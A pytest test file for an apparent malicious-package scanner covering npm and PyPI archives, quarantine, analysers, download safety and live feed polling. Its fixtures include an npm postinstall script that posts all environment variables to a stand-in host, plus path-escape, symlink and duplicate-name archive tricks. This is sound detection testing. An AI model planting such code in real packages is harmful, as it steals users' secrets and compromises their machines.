"""End to end: archive -> quarantine -> analysers -> score -> database.

Downloads go through httpx.MockTransport, so no test touches the network.
"""

import base64
import hashlib
import json
import sys

import httpx
import pytest
from helpers import link_member, tar_with, zip_with

from tripwire import scanner
from tripwire.bench.archive import tar_gz
from tripwire.db import Database
from tripwire.feeds.http import PoliteClient
from tripwire.models import ReleaseRef
from tripwire.pipeline import Pipeline, RunStats, _safe_ext, live_run, percentiles
from tripwire.quarantine import Limits
from tripwire.scanner import analyze_package, scan_archive, scan_directory

BENIGN_NPM = {"package.json": json.dumps({"name": "clean-lib", "version": "1.0.0", "description": "ok"}),
              "index.js": "module.exports = (a, b) => a + b;\n"}
FLAGGED_NPM = {"package.json": json.dumps({"name": "env-sender", "version": "1.0.0", "description": "x",
                                           "scripts": {"postinstall": "node index.js"}}),
               "index.js": ('const https = require("https");\n'
                            'https.request({ hostname: "exfil.example.invalid", method: "POST" })'
                            ".end(JSON.stringify(process.env));\n")}


def archive(tmp_path, files, name="pkg.tgz", prefix="package/"):
    p = tmp_path / name
    p.write_bytes(tar_gz(files, prefix))
    return p


# ------------------------------------------------------------------ scanner

def test_benign_archive_end_to_end(tmp_path, quarantine):
    r = scan_archive(archive(tmp_path, BENIGN_NPM), quarantine=quarantine)
    assert (r.ecosystem, r.name, r.version) == ("npm", "clean-lib", "1.0.0")
    assert r.score == 0 and not r.flagged and r.level == "none"
    assert r.file_count == 2
    assert list(quarantine.iterdir()) == []  # quarantine folder removed afterwards


def test_malicious_archive_end_to_end(tmp_path, quarantine):
    r = scan_archive(archive(tmp_path, FLAGGED_NPM), quarantine=quarantine)
    assert r.flagged and r.level == "critical"
    assert {"install_hooks", "credentials", "network"} <= r.fired_analyzers()
    assert r.evidence == sorted(r.evidence, key=lambda e: (-e.weight, e.analyzer, e.file or "", e.line or 0))
    d = r.to_dict()
    assert d["fired_analyzers"] == sorted(r.fired_analyzers())


def test_wheel_end_to_end(tmp_path, quarantine):
    p = tmp_path / "demo-1.0-py3-none-any.whl"
    p.write_bytes(zip_with([("demo/__init__.py", b"x = 1\n"),
                            ("demo-1.0.dist-info/METADATA", b"Name: demo\nVersion: 1.0\n")]))
    r = scan_archive(p, quarantine=quarantine)
    assert (r.ecosystem, r.name, r.score) == ("pypi", "demo", 0)


def test_keep_leaves_the_extraction(tmp_path, quarantine):
    scan_archive(archive(tmp_path, BENIGN_NPM), quarantine=quarantine, keep=True)
    assert len(list(quarantine.iterdir())) == 1


def test_path_escape_and_links_become_evidence(tmp_path, quarantine):
    p = tmp_path / "evil.tar.gz"
    p.write_bytes(tar_with([("pkg-1/setup.py", b"from setuptools import setup\nsetup(name='x')\n"),
                            ("../../outside.txt", b"filler"), link_member("pkg-1/l", "/etc/hosts")]))
    r = scan_archive(p, quarantine=quarantine)
    rules = {e.rule for e in r.evidence if e.analyzer == "archive"}
    assert rules == {"path_escape", "links"}
    assert not (tmp_path.parent / "outside.txt").exists()


def _entries_tgz(tmp_path, entries, name="dup.tgz"):
    p = tmp_path / name
    p.write_bytes(tar_with([(n, d.encode() if isinstance(d, str) else d) for n, d in entries]))
    return p


@pytest.mark.parametrize("entries", [
    # a decoy copy of the install script first, the real one second (tar: last wins)
    [("package/package.json", FLAGGED_NPM["package.json"]), ("package/index.js", BENIGN_NPM["index.js"]),
     ("package/index.js", FLAGGED_NPM["index.js"])],
    # a package.json without scripts first, the one with the postinstall second
    [("package/package.json", BENIGN_NPM["package.json"]), ("package/index.js", FLAGGED_NPM["index.js"]),
     ("package/package.json", FLAGGED_NPM["package.json"])],
    # an 8.3 short-name alias written after the real file (only bites on NTFS with 8.3 names on)
    [("package/package.json", FLAGGED_NPM["package.json"].replace("index.js", "index_payload.js")),
     ("package/index_payload.js", FLAGGED_NPM["index.js"]), ("package/INDEX_~1.JS", BENIGN_NPM["index.js"])],
], ids=["later-copy-of-script", "later-package-json", "short-name-alias"])
def test_repeated_names_cannot_hide_the_file_that_runs(tmp_path, quarantine, entries):
    r = scan_archive(_entries_tgz(tmp_path, entries), quarantine=quarantine)
    assert r.flagged and "install_hooks" in r.fired_analyzers()
    assert list(quarantine.iterdir()) == []


def test_nested_archive_is_not_unpacked(tmp_path, quarantine):
    # Documented gap, pinned so it cannot change silently: an archive inside the
    # package is counted as a binary file, never opened (no recursive bombs).
    inner = tar_with([("package/index.js", FLAGGED_NPM["index.js"].encode())])
    p = _entries_tgz(tmp_path, [("package/package.json", BENIGN_NPM["package.json"]),
                                ("package/vendor/inner.tgz", inner)])
    r = scan_archive(p, quarantine=quarantine)
    assert r.file_count == 2 and r.score == 0
    assert list(quarantine.iterdir()) == []


def test_case_collision_on_setup_py_is_analysed(tmp_path, quarantine):
    # "Setup.py" first used to win on Windows and hide the "setup.py" pip runs on Linux.
    p = tmp_path / "case.tar.gz"
    p.write_bytes(tar_with([
        ("demo-1.0/Setup.py", b"from setuptools import setup\nsetup(name='demo')\n"),
        ("demo-1.0/setup.py", b"import subprocess\nsubprocess.run(['hostname'])\n"
                              b"from setuptools import setup\nsetup(name='demo')\n"),
    ]))
    r = scan_archive(p, ecosystem="pypi", quarantine=quarantine)
    assert "install_hooks" in r.fired_analyzers()
    assert any(e.rule == "name_collision" for e in r.evidence)


def test_extraction_error_propagates_and_cleans_up(tmp_path, quarantine):
    p = tmp_path / "bad.tgz"
    p.write_bytes(b"not an archive at all")
    with pytest.raises(scanner.ExtractionError):
        scan_archive(p, quarantine=quarantine)
    assert list(quarantine.iterdir()) == []


def test_limits_are_passed_through(tmp_path, quarantine):
    with pytest.raises(scanner.ExtractionError):
        scan_archive(archive(tmp_path, BENIGN_NPM), quarantine=quarantine, limits=Limits(max_members=1))


def test_one_failing_analyser_does_not_hide_the_others(tmp_path, monkeypatch):
    class Broken:
        name = "broken"

        def analyze(self, pkg):
            raise ValueError("boom")

    class Deep:
        name = "deep"

        def analyze(self, pkg):
            raise RecursionError

    monkeypatch.setattr(scanner, "ANALYZERS", (Broken(), Deep(), *scanner.ANALYZERS))
    from tripwire.loader import package_from_texts
    r = analyze_package(package_from_texts(FLAGGED_NPM, "npm"))
    errors = {e.analyzer: e.message for e in r.evidence if e.rule == "analyzer_error"}
    assert "ValueError" in errors["broken"] and "deeply nested" in errors["deep"]
    assert r.flagged  # the real analysers still ran


def test_unreadable_files_become_evidence():
    from tripwire.loader import package_from_texts
    pkg = package_from_texts(BENIGN_NPM, "npm")
    pkg.unreadable = ["lib/hidden.js"]
    r = analyze_package(pkg)
    ev = [e for e in r.evidence if e.rule == "unreadable_files"]
    assert ev and ev[0].weight == 0.4 and ev[0].file == "lib/hidden.js"


def test_scan_directory(tmp_path):
    (tmp_path / "proj").mkdir()
    for rel, text in FLAGGED_NPM.items():
        (tmp_path / "proj" / rel).write_text(text)
    (tmp_path / "proj" / "node_modules" / "dep").mkdir(parents=True)
    (tmp_path / "proj" / "node_modules" / "dep" / "x.js").write_text("eval(atob('x'))")
    r = scan_directory(tmp_path / "proj")
    assert r.flagged and r.name == "env-sender"
    assert not any("node_modules" in (e.file or "") for e in r.evidence)


def test_scan_directory_skips_symlinks(tmp_path):
    root = tmp_path / "proj"
    root.mkdir()
    (root / "a.py").write_text("x = 1\n")
    try:
        (root / "link.py").symlink_to(tmp_path / "elsewhere.py")
    except OSError:
        pytest.skip("creating symlinks needs extra rights on this Windows account")
    r = scan_directory(root, ecosystem="pypi")
    assert any(e.rule == "links" for e in r.evidence)


@pytest.mark.skipif(sys.platform != "win32", reason="NTFS junctions are Windows-only")
def test_scan_directory_does_not_follow_junctions(tmp_path):
    # os.walk(followlinks=False) still walks into junctions, which need no admin
    # rights to create and can point anywhere, including back at a parent.
    root = tmp_path / "proj"
    root.mkdir()
    (root / "a.py").write_text("x = 1\n")
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "elsewhere.py").write_text("y = 2\n")
    import _winapi
    _winapi.CreateJunction(str(outside), str(root / "jn"))
    r = scan_directory(root, ecosystem="pypi")
    assert r.file_count == 1
    assert any(e.rule == "links" for e in r.evidence)


def test_default_quarantine_is_not_inside_site_packages():
    assert "site-packages" not in str(scanner.DEFAULT_QUARANTINE)


# ------------------------------------------------------------------ helpers

@pytest.mark.parametrize("name,ext", [("a-1.0.tar.gz", ".tar.gz"), ("x.TGZ", ".tgz"), ("w.whl", ".whl"),
                                      ("../../evil.exe", ".bin"), ("p.zip", ".zip")])
def test_safe_ext(name, ext):
    assert _safe_ext(name) == ext


def test_percentiles():
    assert percentiles([]) == {"n": 0, "p50": None, "p95": None, "max": None}
    vals = [i / 1000 for i in range(1, 101)]  # 1..100 ms
    assert percentiles(vals) == {"n": 100, "p50": 50.0, "p95": 95.0, "max": 100.0}
    assert percentiles([0.002]) == {"n": 1, "p50": 2.0, "p95": 2.0, "max": 2.0}


# ------------------------------------------------------------------ Pipeline.process

def make_client(routes: dict[str, httpx.Response | bytes]) -> PoliteClient:
    def handler(request: httpx.Request) -> httpx.Response:
        got = routes.get(str(request.url))
        if got is None:
            return httpx.Response(404)
        return got if isinstance(got, httpx.Response) else httpx.Response(200, stream=httpx.ByteStream(got))

    return PoliteClient(transport=httpx.MockTransport(handler), min_interval=0, sleep=lambda s: None)


def sri(data: bytes) -> str:
    return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()


TGZ_URL = "https://registry.npmjs.org/env-sender/-/env-sender-1.0.0.tgz"


def ref(**kw) -> ReleaseRef:
    base = dict(ecosystem="npm", name="env-sender", version="1.0.0", artifact_url=TGZ_URL,
                filename="env-sender-1.0.0.tgz")
    base.update(kw)
    return ReleaseRef(**base)


@pytest.fixture
def db():
    d = Database(":memory:")
    yield d
    d.close()


def test_process_downloads_scans_and_stores(db, quarantine):
    data = tar_gz(FLAGGED_NPM, "package/")
    pipe = Pipeline(db, make_client({TGZ_URL: data}), quarantine=quarantine, log=lambda m: None)
    stats = RunStats()
    assert pipe.process(ref(integrity=sri(data)), stats) == "flagged"
    rows, total = db.list_releases()
    assert total == 1 and rows[0]["flagged"] and rows[0]["status"] == "scanned"
    assert stats.scanned == 1 and stats.flagged == 1 and stats.levels == {"critical": 1}
    assert len(stats.scan_seconds) == 1 and len(stats.download_seconds) == 1
    assert list(quarantine.iterdir()) == []  # download and extraction both removed
    # a second sighting of the same release is skipped
    assert pipe.process(ref(integrity=sri(data)), stats) == "duplicate" and stats.duplicates == 1


def test_digest_mismatch_is_an_error(db, quarantine):
    data = tar_gz(BENIGN_NPM, "package/")
    pipe = Pipeline(db, make_client({TGZ_URL: data}), quarantine=quarantine, log=lambda m: None)
    stats = RunStats()
    assert pipe.process(ref(integrity=sri(b"something else")), stats) == "error"
    row = db.list_releases()[0][0]
    assert row["status"] == "error" and "digest" in row["status_detail"]


def test_oversized_release_is_skipped_without_download(db, quarantine):
    calls = []
    client = make_client({})
    client._client = httpx.Client(transport=httpx.MockTransport(lambda r: calls.append(r) or httpx.Response(500)))
    pipe = Pipeline(db, client, quarantine=quarantine, limits=Limits(max_archive_bytes=100), log=lambda m: None)
    assert pipe.process(ref(size=10_000), RunStats()) == "skipped"
    assert calls == []


def test_download_from_unknown_host_is_refused(db, quarantine):
    pipe = Pipeline(db, make_client({}), quarantine=quarantine, log=lambda m: None)
    out = pipe.process(ref(artifact_url="https://cdn.example.invalid/x.tgz"), RunStats())
    assert out == "error"
    assert "DownloadRefused" in db.list_releases()[0][0]["status_detail"]


def test_redirect_is_not_followed(db, quarantine):
    redirect = httpx.Response(302, headers={"Location": "https://cdn.example.invalid/x.tgz"})
    pipe = Pipeline(db, make_client({TGZ_URL: redirect}), quarantine=quarantine, log=lambda m: None)
    assert pipe.process(ref(), RunStats()) == "error"
    assert "redirected" in db.list_releases()[0][0]["status_detail"]


def test_http_error_is_recorded(db, quarantine):
    pipe = Pipeline(db, make_client({}), quarantine=quarantine, log=lambda m: None)
    assert pipe.process(ref(), RunStats()) == "error"
    assert "404" in db.list_releases()[0][0]["status_detail"]


def test_quarantine_on_sys_path_is_refused(db, tmp_path, monkeypatch):
    import sys
    monkeypatch.setattr(sys, "path", [str(tmp_path)] + sys.path)
    with pytest.raises(RuntimeError):
        Pipeline(db, make_client({}), quarantine=tmp_path)


# ------------------------------------------------------------------ live_run with fake feeds

class FakeFeed:
    def __init__(self, batches):
        self.batches = list(batches)
        self.committed = []

    def poll(self):
        return self.batches.pop(0) if self.batches else []

    def resolve(self, cand):
        if cand == "gone":
            raise httpx.HTTPStatusError("404", request=httpx.Request("GET", "https://x"), response=httpx.Response(404))
        return ref(name=cand, version="1.0.0", artifact_url=f"https://registry.npmjs.org/{cand}/-/{cand}.tgz")

    def commit(self, cand):
        self.committed.append(cand)


def feeds_client(names):
    data = tar_gz(BENIGN_NPM, "package/")
    return make_client({f"https://registry.npmjs.org/{n}/-/{n}.tgz": data for n in names})


def test_live_run_once_stops_after_one_poll(db, quarantine):
    feed = FakeFeed([["a", "b", "gone"], ["never"]])
    stats = live_run(db, feeds={"npm": feed}, client=feeds_client(["a", "b"]), quarantine=quarantine,
                     once=True, log=lambda m: None, sleep=lambda s: None)
    assert stats.scanned == 2 and stats.errors == 1
    assert feed.committed == ["a", "b", "gone"]  # failed candidates are committed too, so resume skips them
    assert feed.batches == [["never"]]


def test_live_run_limit(db, quarantine):
    feed = FakeFeed([["a", "b", "c", "d"]])
    stats = live_run(db, feeds={"npm": feed}, client=feeds_client("abcd"), quarantine=quarantine,
                     max_releases=2, log=lambda m: None, sleep=lambda s: None)
    assert stats.seen == 2 and feed.committed == ["a", "b"]


def test_live_run_deadline_with_fake_clock(db, quarantine):
    now = [0.0]

    def clock():
        now[0] += 10
        return now[0]

    stats = live_run(db, feeds={"npm": FakeFeed([])}, client=feeds_client([]), quarantine=quarantine,
                     seconds=100, clock=clock, sleep=lambda s: None, log=lambda m: None)
    assert stats.seen == 0


def test_live_run_round_robin_between_feeds(db, quarantine):
    order = []

    class Recording(FakeFeed):
        def __init__(self, tag, batches):
            super().__init__(batches)
            self.tag = tag

        def resolve(self, cand):
            order.append(self.tag)
            return super().resolve(cand)

    feeds = {"pypi": Recording("p", [["p1", "p2"]]), "npm": Recording("n", [["n1", "n2"]])}
    live_run(db, feeds=feeds, client=feeds_client(["p1", "p2", "n1", "n2"]), quarantine=quarantine, once=True,
             log=lambda m: None, sleep=lambda s: None)
    assert order == ["p", "n", "p", "n"]


def test_live_run_survives_poll_failure(db, quarantine):
    class Failing(FakeFeed):
        def poll(self):
            raise httpx.ConnectError("offline")

    logs = []
    stats = live_run(db, feeds={"npm": Failing([])}, client=feeds_client([]), quarantine=quarantine, once=True,
                     log=logs.append, sleep=lambda s: None)
    assert stats.seen == 0 and any("poll failed" in m for m in logs)


def test_run_stats_summary_shape():
    s = RunStats(seen=3, scanned=2)
    s.scan_seconds = [0.01, 0.02]
    d = s.summary()
    assert d["scan_ms"]["n"] == 2 and d["download_ms"]["n"] == 0 and d["seen"] == 3
